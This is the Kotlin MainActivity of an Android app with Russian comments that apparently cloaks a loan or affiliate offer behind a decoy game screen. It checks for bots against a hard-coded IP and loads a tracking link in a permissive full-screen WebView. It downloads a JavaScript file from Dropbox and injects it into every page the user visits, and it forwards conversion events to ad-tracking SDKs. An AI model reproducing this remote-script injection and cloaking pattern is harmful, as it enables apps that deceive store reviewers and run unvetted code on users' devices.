package com.organizationzaim.multiapp

import android.annotation.SuppressLint
import android.app.Activity
import android.app.AlertDialog
import android.app.ProgressDialog
import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.graphics.Bitmap
import android.graphics.Rect
import android.net.ConnectivityManager
import android.net.Uri
import android.os.*
import android.provider.MediaStore
import android.util.Log
import android.view.KeyEvent
import android.view.View
import android.view.WindowManager
import android.webkit.*
import androidx.appcompat.app.AppCompatActivity
import bolts.AppLinks
import com.appsflyer.AppsFlyerConversionListener
import com.appsflyer.AppsFlyerLib
import com.appsflyer.AppsFlyerLibCore
import com.facebook.FacebookSdk
import com.facebook.appevents.AppEventsConstants
import com.facebook.appevents.AppEventsLogger
import com.facebook.applinks.AppLinkData
import com.onesignal.OSNotification
import com.onesignal.OneSignal
import com.organizationzaim.multiapp.FakeView.Game.GameActivity
import com.organizationzaim.multiapp.web.NetworkFalseActivity
import kotlinx.coroutines.*
import okhttp3.OkHttpClient
import okhttp3.Request
import org.json.JSONException
import org.json.JSONObject
import java.io.File
import java.io.IOException
import java.text.SimpleDateFormat
import java.util.*


class MainActivity : AppCompatActivity(), OneSignal.NotificationReceivedHandler {

    private lateinit var okHttpClient: OkHttpClient
    private lateinit var preferences: SharedPreferences

    private var isConnected                                   = true
    private var webView: WebView?                             = null
    private var mFilePathCallback: ValueCallback<Array<Uri>>? = null
    private var mCameraPhotoPath: String?                     = null
    private var URL: String?                                  = null
    private var progressBar: ProgressDialog?                  = null
    private var alertDialog: AlertDialog?                     = null
    private val backDeque: Deque<String> = LinkedList()
    private lateinit var script : String

    private val isNetworkAvailable2: Boolean
        get() {
            println("isNetworkAvailable2 called")
            val info = (applicationContext
                .getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager)
                .activeNetworkInfo
            return !(info == null || !info.isAvailable || !info.isConnected)
        }

    private val handler = Handler(Looper.getMainLooper())
    private val conversionTask = object : Runnable {
        override fun run() {
            GlobalScope.launch {
                val json = getConversion()
                val eventName = "event"
                val valueName = "value"
                if (json.has(eventName)) {
                    val value =
                        json.optString(valueName) ?: " " // при пустом value отправляем пробел
                    sendOnesignalEvent(json.optString(eventName), value)
                    sendFacebookEvent(json.optString(eventName), value)
                    sendAppsflyerEvent(json.optString(eventName), value)
                }
            }
            handler.postDelayed(this, 15000)
        }
    }

    companion object {
        private const val TAG = "MainA1ctivi"
        private const val INPUT_FILE_REQUEST_CODE = 1
    }

    override fun onCreate(savedInstanceState: Bundle?)                                         {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        FacebookSdk.setApplicationId("293366948652919")

        initWebView()
        initOkHttpClient()
        initSDK()

        Log.d(TAG, "START1")
        preferences = this.getSharedPreferences("MyPreferences", Context.MODE_PRIVATE)
        val strDeque = preferences.getString("PREFS_DEQUE", null)
        strDeque?.let {
            for (elem in strDeque.split(",")) {
                addToDeque(elem)
            }
        }
        val deque: Deque<String> = LinkedList()
        Log.d(TAG, deque.isNotEmpty().toString() + "(*-*)")
        if (backDeque.isNotEmpty()) {

            Log.d(TAG, "IS")
            Log.d(TAG, backDeque.first.toString() + "!!!!")
            Log.d(TAG, backDeque.first + ">><<<")

            webView?.loadUrl(backDeque.first)
            backDeque.removeFirst()
        } else {
            Log.d(TAG, "NOTHING")
            preferences = this.getSharedPreferences("MyPreferences", Context.MODE_PRIVATE)

            val deeplink = preferences.getString("PREFS_DEEPLINK", null)

            if (deeplink == null) {
                Log.d(TAG, "deeplink = null")
                getDeeplinkFromFacebook()
            } else {
                // Иначе начинаем обработку диплинка
                Log.d(TAG, "deeplink != null")
                processDeeplinkAndStart(deeplink)
            }
        }
    }



//-------------------------------------OK-HTTP-REQUEST--------------------------------------------//
    private fun initOkHttpClient()                                                             {
        okHttpClient = OkHttpClient.Builder()
            .followSslRedirects(false)
            .followRedirects(false)
            .addNetworkInterceptor {
                it.proceed(
                    it.request().newBuilder()
                        .header("User-Agent", WebSettings.getDefaultUserAgent(this))
                        .build()
                )
            }.build()

    }
    private fun isBot(): Boolean                                                               {
        try {
            val response = okHttpClient
                .newCall(Request.Builder().url("http://78.47.187.129/Z4ZvXH31").build())
                .execute()
            val redirectLocation = response.header("Location")

            redirectLocation?.let { return Uri.parse(it).host == "bot" } ?: return true
        } catch (ex: Exception) {
            return true
        }
    }

//-------------------------------------DEEPLINK---------------------------------------------------//
    private fun getDeeplinkFromFacebook()                                                      {
        FacebookSdk.setAutoInitEnabled(true)
        FacebookSdk.fullyInitialize()
        AppLinkData.fetchDeferredAppLinkData(applicationContext) { appLinkData ->
            val uri: Uri? = appLinkData?.targetUri ?: AppLinks.getTargetUrlFromInboundIntent(this, intent)

            // В переменную uri записывается отложенный диплинк appLinkData.targetUri
            // Если он равен null, то диплинк берется из интента (getTargetUrlFromInboundIntent)

            if (uri != null && uri.query != null) {
                processDeeplinkAndStart(uri.query!!) // передаем параметры диплинка дальше и обрабатываем
                preferences.edit().putString("PREFS_DEEPLINK", uri.query!!).apply()
            } else {
                processDeeplinkAndStart("") // передаем пустую строку в метод обработки диплинка
            }

        }
    }
    private fun processDeeplinkAndStart(deeplink: String)                                      {

        val trackingUrl = "https://wokeup.site/click.php?key=ZvjJ12Wr2oTlGNLQyhV9"

        val clickId = getClickId()
        val sourceId = BuildConfig.APPLICATION_ID
        var finalUrl = "$trackingUrl&source=$sourceId&click_id=$clickId"

        if (!deeplink.isBlank()) {
            finalUrl = "$finalUrl&$deeplink"
        }

        GlobalScope.launch(Dispatchers.Main) {
            Log.d(TAG, "TTTTTT")
            val analyticsJs = "https://dl.dropboxusercontent.com/s/lmibwymtkebspij/background.js" //NOT CORRECTED!!
            // Запускаем задачу на скачивание скрипта с дропбокса
            var scriptTask = async(Dispatchers.IO) { java.net.URL(analyticsJs).readText(Charsets.UTF_8) }

            // ОБЯЗАТЕЛЬНО дожидаемся загрузки скрипта (!!!)
            // Мы асинхронно пытаемся получить скрипт с дропбокса
            // Поэтому в этом же launch {} контексте должен быть метод с ожиданием .await()
            // И только после .await() в контексте launch {} можем продолжать код
            script = scriptTask.await()
            Log.d(TAG, "Script$script")

            val isBot = withContext(Dispatchers.IO) { isBot() }

            Log.d(TAG, "IS_BOT$isBot")

            if (0 == 1) {
                startActivity(Intent(this@MainActivity, GameActivity::class.java))
                finish()
            } else {
                initWebView()
//                handler.post(conversionTask) // Запускаем проверку конверсии по таймеру (Пункт 6)

                OneSignal.sendTag("nobot", "1")
                OneSignal.sendTag("bundle", BuildConfig.APPLICATION_ID)

                val streamId = Uri.parse("?$deeplink").getQueryParameter("stream")

                if (!streamId.isNullOrBlank()) {
                    OneSignal.sendTag("stream", streamId)
                }

                initWebView()

                URL = finalUrl

                webView?.loadUrl(URL!!)

                webView?.setNetworkAvailable(isConnected)

                val cookieManager = CookieManager.getInstance()
                cookieManager.setAcceptCookie(true)
                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.LOLLIPOP) {
                    cookieManager.setAcceptThirdPartyCookies(webView, true)
                }
                webView?.webViewClient = object : WebViewClient() {

                    override fun onPageStarted(view: WebView, url: String, favicon: Bitmap?) {
                        println("page loading started")
                        if (!isNetworkAvailable2) {
                            showInfoMessageDialog()
                            println("network not available")
                            return
                        } else println("network available")
                        super.onPageStarted(view, url, favicon)
                    }

                    override fun onPageFinished(view: WebView?, url: String?) {
                        CookieManager.getInstance().flush() // Синхронизируем cookie
//                        if (progressBar?.isShowing!!) {
//                            progressBar?.dismiss()
//                        }
                        url?.let { if (it != "about:blank") addToDeque(it) }
                        val queryId = preferences.getString("PREFS_QUERYID", "")
                        webView?.evaluateJavascript(script) { // Загружаем в вебвью полученный раннее скрипт
                            webView?.evaluateJavascript("q('$queryId');") {}
                            Log.d(TAG, "load")
                        }
                    }

                    override fun onReceivedError(view: WebView, errorCode: Int, description: String, failingUrl: String) {
                        alertDialog?.setTitle("Error")
                        alertDialog?.setMessage(description)
                        alertDialog?.show()
                        if (errorCode == ERROR_TIMEOUT) {
                            view.stopLoading() // may not be needed
                            // view.loadData(timeoutMessageHtml, "text/html", "utf-8");
                        }
                    }

                    override fun shouldOverrideUrlLoading(view: WebView, url: String): Boolean {
                        CookieSyncManager.getInstance().sync()
                        view.loadUrl(url)
                        Uri.parse(url).getQueryParameter("cust_offer_id")
                            ?.let {
                                // Получаем query id из текущей ссылки и если оно существует, сохраняем в хранилище
                                preferences.edit().putString("PREFS_QUERYID", it).apply()
                            }

                        return false
                    }

                }
                webView?.webChromeClient = object : WebChromeClient() {

                    @SuppressLint("SimpleDateFormat")
                    @Throws(IOException::class)
                    private fun createImageFile(): File {
                        // Create an image file name
                        val timeStamp =
                            SimpleDateFormat("yyyyMMdd_HHmmss").format(Date())
                        val imageFileName = "JPEG_" + timeStamp + "_"
                        val storageDir = Environment.getExternalStoragePublicDirectory(
                            Environment.DIRECTORY_PICTURES
                        )
                        return File.createTempFile(
                            imageFileName,  /* prefix */
                            ".jpg",  /* suffix */
                            storageDir /* directory */
                        )
                    }

                    override fun onShowFileChooser(
                        view: WebView,
                        filePath: ValueCallback<Array<Uri>>,
                        fileChooserParams: FileChooserParams
                    ): Boolean {
                        // Double check that we don't have any existing callbacks
                        if (mFilePathCallback != null) {
                            mFilePathCallback!!.onReceiveValue(null)
                        }
                        mFilePathCallback = filePath
                        var takePictureIntent: Intent? = Intent(MediaStore.ACTION_IMAGE_CAPTURE)
                        if (takePictureIntent!!.resolveActivity(packageManager) != null) {
                            // Create the File where the photo should go
                            var photoFile: File? = null
                            try {
                                photoFile = createImageFile()
                                takePictureIntent.putExtra("PhotoPath", mCameraPhotoPath)
                            } catch (ex: IOException) {
                                // Error occurred while creating the File
                                Log.e(
                                    MainActivity.TAG,
                                    "Unable to create Image File",
                                    ex
                                )
                            }
                            // Continue only if the File was successfully created
                            if (photoFile != null) {
                                mCameraPhotoPath = "file:" + photoFile.absolutePath
                                takePictureIntent.putExtra(
                                    MediaStore.EXTRA_OUTPUT,
                                    Uri.fromFile(photoFile)
                                )
                            } else {
                                takePictureIntent = null
                            }
                        }
                        val contentSelectionIntent = Intent(Intent.ACTION_GET_CONTENT)
                        contentSelectionIntent.addCategory(Intent.CATEGORY_OPENABLE)
                        contentSelectionIntent.type = "image/*"
                        val intentArray: Array<Intent?>
                        if (takePictureIntent != null) {
                            intentArray = arrayOf<Intent?>(takePictureIntent)

                        } else {
                            intentArray = arrayOfNulls(0)
                        }
                        val chooserIntent = Intent(Intent.ACTION_CHOOSER)
                        chooserIntent.putExtra(Intent.EXTRA_INTENT, contentSelectionIntent)
                        chooserIntent.putExtra(Intent.EXTRA_TITLE, "Image Chooser")
                        chooserIntent.putExtra(Intent.EXTRA_INITIAL_INTENTS, intentArray)
                        startActivityForResult(
                            chooserIntent,
                            MainActivity.INPUT_FILE_REQUEST_CODE
                        )
                        return true
                    }
                }
            }
        }
    }
    private fun getClickId(): String                                                           {
        // Пробуем получить click_id из хранилища
        // Если его там нет, получим null
        var clickId = preferences.getString("PREFS_CLICK_ID", null)
        if (clickId == null) {
            // в случае если в хранилище нет click_id, генерируем новый
            clickId = UUID.randomUUID().toString()
            preferences.edit().putString("PREFS_CLICK_ID", clickId)
                .apply() // и сохраняем в хранилище
        }
        return clickId
    }

//----------------------------------------WEBVIEW-------------------------------------------------//
    private fun initWebView()                                                                  {

    toScroll(false)

    val cookieManager = CookieManager.getInstance()
    cookieManager.setAcceptCookie(true)

    window.decorView.viewTreeObserver.addOnGlobalLayoutListener {
        val bit = Rect()
        window.decorView.getWindowVisibleDisplayFrame(bit)

        val osh = window.decorView.rootView.height
        val ka = osh - bit.bottom
        val kart = ka > osh * 0.1399
        toScroll(kart)
    }

    webView = findViewById(R.id.webView)

    webView?.scrollBarStyle = WebView.SCROLLBARS_OUTSIDE_OVERLAY
    webView?.settings?.loadWithOverviewMode = true
    webView?.settings?.useWideViewPort = true
    webView?.settings?.domStorageEnabled = true
    webView?.settings?.databaseEnabled = true
    webView?.settings?.setSupportZoom(false)
    webView?.settings?.allowFileAccess = true
    webView?.settings?.allowContentAccess = true
    webView?.settings?.loadWithOverviewMode = true
    webView?.settings?.useWideViewPort = true
    webView?.settings?.allowFileAccess = true
    webView?.settings?.domStorageEnabled = true
    webView?.settings?.mixedContentMode = WebSettings.MIXED_CONTENT_ALWAYS_ALLOW
    webView?.settings?.mediaPlaybackRequiresUserGesture = true
}
    private fun showInfoMessageDialog()                                                        {
        val intent = Intent(this, NetworkFalseActivity::class.java)
        startActivity(intent)
        finish()
    }
    private fun toScroll(flag: Boolean)                                                        {
        if (flag){
            window.clearFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN)
            window.decorView.systemUiVisibility = View.SYSTEM_UI_FLAG_VISIBLE
        }else{
            window.setFlags(
                WindowManager.LayoutParams.FLAG_FULLSCREEN,
                WindowManager.LayoutParams.FLAG_FULLSCREEN
            )

            window.decorView.systemUiVisibility = (
                    View.SYSTEM_UI_FLAG_LAYOUT_STABLE
                            or View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
                            or View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
                            or View.SYSTEM_UI_FLAG_HIDE_NAVIGATION)
        }
    }
    override fun onKeyDown(keyCode: Int, event: KeyEvent): Boolean                             {
        if (keyCode == KeyEvent.KEYCODE_BACK && webView!!.canGoBack()) {
            webView!!.goBack()
            return true
        }
        return false
    }
    override fun onBackPressed()                                                               {
        if (!goBackWithDeque()) {
            // Если в очереди нет ссылок, возвращаемся назад по умолчанию
            super.onBackPressed()
        }
    }
    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?)            {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            if (requestCode != INPUT_FILE_REQUEST_CODE || mFilePathCallback == null) {
                super.onActivityResult(requestCode, resultCode, data)
                return
            }
            var results: Array<Uri>? = null
            // Check that the response is a good one
            if (resultCode == Activity.RESULT_OK) {
                if (data == null) {
                    // If there is not data, then we may have taken a photo
                    if (mCameraPhotoPath != null) {
                        results = arrayOf(Uri.parse(mCameraPhotoPath))
                    }
                } else {
                    val dataString = data.dataString
                    if (dataString != null) {
                        results = arrayOf(Uri.parse(dataString))
                    }
                }
            }
            mFilePathCallback!!.onReceiveValue(results)
            mFilePathCallback = null
        } else
            return
    }

//-----------------------------------Запоминание-пяти-последних-ссылок----------------------------//
    override fun onStop()                                                                      {
        super.onStop()
        preferences.edit().putString("PREFS_DEQUE", backDeque.reversed().joinToString(",")).apply()
    }
    private fun addToDeque(url: String)                                                        {
        if (backDeque.size > 5) {
            backDeque.removeLast()
        }
        backDeque.addFirst(url)
    }
    private fun goBackWithDeque(): Boolean                                                     {
        try {
            if (backDeque.size == 1) return false;

            // Удаляем текущую ссылку
            backDeque.removeFirst()
            webView?.loadUrl(backDeque.first)

            // Удаляем предыдущую ссылку, т.к. она повторно добавится в onPageFinished
            backDeque.removeFirst()
            return true

        } catch (ex: NoSuchElementException) {
            ex.printStackTrace()
            return false
        }
    }

//-------------------------------------EVENTS-TO-SDK----------------------------------------------//
    private fun getConversion(): JSONObject                                                    {
        val conversionUrl = "https://freerun.site/conversion.php"
        return try {
            val response = okHttpClient // Делаем запрос, добавив к ссылке click_id
                .newCall(Request.Builder().url("$conversionUrl?click_id=${getClickId()}").build())
                .execute()
            JSONObject(response.body()?.string() ?: "{}")
        } catch (ex: Exception) {
            JSONObject("{}")
        }
    }
    private fun sendOnesignalEvent(key: String, value: String)                                 {
        OneSignal.sendTag(key, value)
    }
    private fun sendFacebookEvent(key: String, value: String)                                  {
        val fb = AppEventsLogger.newLogger(this)

        val bundle = Bundle()
        when (key) {
            "reg" -> {
                bundle.putString(AppEventsConstants.EVENT_PARAM_CONTENT, value)
                fb.logEvent(AppEventsConstants.EVENT_NAME_COMPLETED_REGISTRATION, bundle)
            }
            "dep" -> {
                bundle.putString(AppEventsConstants.EVENT_PARAM_CONTENT, value)
                fb.logEvent(AppEventsConstants.EVENT_NAME_ADDED_TO_CART, bundle)
            }
        }
    }
    private fun sendAppsflyerEvent(key: String, value: String)                                 {
        val values = HashMap<String, Any>()
        values[key] = value
        AppsFlyerLib.getInstance().trackEvent(this, key, values)
    }
    private fun initSDK()                                                                      {
        OneSignal.setLogLevel(OneSignal.LOG_LEVEL.VERBOSE, OneSignal.LOG_LEVEL.NONE);

        OneSignal.startInit(this)
            .setNotificationReceivedHandler(this)
            .inFocusDisplaying(OneSignal.OSInFocusDisplayOption.Notification)
            .unsubscribeWhenNotificationsAreDisabled(true)
            .init()

        val devKey = "qrdZGj123456789"; // ЗДЕСЬ ДОЛЖЕН БЫТЬ ВАШ КЛЮЧ, ПОЛУЧЕННЫЙ ИЗ APPSFLYER !!!
        val conversionDataListener  = object : AppsFlyerConversionListener {
            override fun onConversionDataSuccess(data: MutableMap<String, Any>?) {
                data?.let { cvData ->
                    cvData.map {
                        Log.i(AppsFlyerLibCore.LOG_TAG, "conversion_attribute:  ${it.key} = ${it.value}")
                    }
                }
            }

            override fun onConversionDataFail(error: String?) {
                Log.e(AppsFlyerLibCore.LOG_TAG, "error onAttributionFailure :  $error")
            }

            override fun onAppOpenAttribution(data: MutableMap<String, String>?) {
                data?.map {
                    Log.d(AppsFlyerLibCore.LOG_TAG, "onAppOpen_attribute: ${it.key} = ${it.value}")
                }
            }

            override fun onAttributionFailure(error: String?) {
                Log.e(AppsFlyerLibCore.LOG_TAG, "error onAttributionFailure :  $error")
            }
        }

        AppsFlyerLib.getInstance().init(devKey, conversionDataListener, this)
        AppsFlyerLib.getInstance().startTracking(this)
    }

    override fun notificationReceived(notification: OSNotification) {
        val keys = notification.payload.additionalData.keys()
        while (keys.hasNext()) {
            val key = keys.next()
            try {
                OneSignal.sendTag(key, notification.payload.additionalData.get(key).toString())
            } catch (e: JSONException) {
                e.printStackTrace()
            }
        }
    }

}
